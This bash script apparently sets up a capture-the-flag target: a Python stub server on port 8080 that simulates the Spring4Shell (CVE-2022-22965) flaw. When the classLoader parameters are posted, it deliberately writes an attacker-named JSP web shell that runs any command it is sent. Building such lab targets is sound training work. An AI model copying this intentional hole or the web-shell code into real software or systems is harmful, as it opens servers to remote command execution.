#!/bin/bash
# Run the Spring4Shell vulnerable demo using a simple Python HTTP server
# simulating a Spring MVC application for CTF purposes

# A simplified Spring4Shell vulnerable app simulation using python
# In a real scenario, download a pre-built vulnerable spring-boot jar

# Check if we have a JAR, otherwise serve a stub
if [ -f /opt/spring-app/app.jar ]; then
    java -jar /opt/spring-app/app.jar
else
    # Stub HTTP server simulating the vulnerable endpoint
    python3 -c "
import http.server
import subprocess
import urllib.parse

class VulnerableHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'''<html><body>
        <h1>Spring MVC Demo App</h1>
        <p>Spring Framework 5.3.17 (CVE-2022-22965 - Spring4Shell)</p>
        <form method=POST action=/greeting>
            <input name=name value=World>
            <button>Submit</button>
        </form>
        </body></html>''')
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        # Vulnerable class.module.classLoader chain simulation
        if 'class.module.classLoader' in body:
            # Parse the logging path (Spring4Shell vector)
            params = urllib.parse.parse_qs(body)
            shell_path = params.get('class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat', [None])[0]
            if shell_path:
                jsp_dir = params.get('class.module.classLoader.resources.context.parent.pipeline.first.directory', ['/tmp'])[0]
                prefix = params.get('class.module.classLoader.resources.context.parent.pipeline.first.prefix', ['shell'])[0]
                suffix = params.get('class.module.classLoader.resources.context.parent.pipeline.first.suffix', ['.jsp'])[0]
                shell_file = f'{jsp_dir}/{prefix}{suffix}'
                with open(shell_file, 'w') as f:
                    f.write('<%@ page import=\"java.util.*,java.io.*\"%><% String cmd = request.getParameter(\"cmd\"); if(cmd!=null){Process p=Runtime.getRuntime().exec(cmd);OutputStream os=response.getOutputStream();byte[] b=new byte[2048];int l;while((l=p.getInputStream().read(b))!=-1)os.write(b,0,l);}%>')
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<html><body><h1>Hello!</h1></body></html>')
    def log_message(self, fmt, *args):
        pass

server = http.server.HTTPServer(('0.0.0.0', 8080), VulnerableHandler)
print('Spring4Shell demo running on port 8080')
server.serve_forever()
"
fi
